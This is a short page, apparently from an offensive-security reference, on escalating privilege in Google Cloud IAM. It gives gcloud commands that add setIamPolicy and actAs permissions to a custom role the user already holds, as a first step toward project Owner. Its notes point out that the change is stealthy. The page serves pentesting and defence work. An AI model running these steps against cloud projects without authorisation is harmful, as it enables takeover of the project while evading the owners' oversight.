---
title: "Custom role update: add permissions to a role you already hold"
description: "Adding permissions to a custom role you are already bound to with iam.roles.update, escalating without any new binding."
keywords:
  - iam.roles.update
  - custom role
  - permission
  - privilege escalation
  - role edit
---

# Custom role update

If you are bound to a **custom role** and hold `iam.roles.update` on it, you add any permission to that role and inherit it instantly, with no new binding to create. This is quiet because your membership does not change, only the definition of a role you already have.

## Add permissions to the role

```bash
# see the role you are bound to
gcloud iam roles describe <roleId> --project=<project>

# add the permissions you want (for example the setIamPolicy to then grant Owner)
gcloud iam roles update <roleId> --project=<project> \
  --add-permissions=resourcemanager.projects.setIamPolicy,iam.serviceAccounts.actAs
```

With `resourcemanager.projects.setIamPolicy` now in your role, follow the [setIamPolicy](set-iam-policy.md) path to Owner; with `iam.serviceAccounts.actAs`, follow an [actAs deployment](act-as-deployment/index.md).

## Exploitation notes

- This only works on **custom** roles; predefined Google roles cannot be edited.
- You must already be a member of the role for the new permission to reach you; otherwise update plus a self-binding is two steps.
- Adding a single pivot permission (`setIamPolicy` or `actAs`) is stealthier than granting the role everything.

## Tools

- **gcloud** (`iam roles update --add-permissions`): the edit.
- **GCP-IAM-Privilege-Escalation** (Rhino): flags editable custom roles you are bound to.

## References

- [Rhino Security Labs: GCP privilege escalation (part 1)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: creating and managing custom roles](https://cloud.google.com/iam/docs/creating-custom-roles)
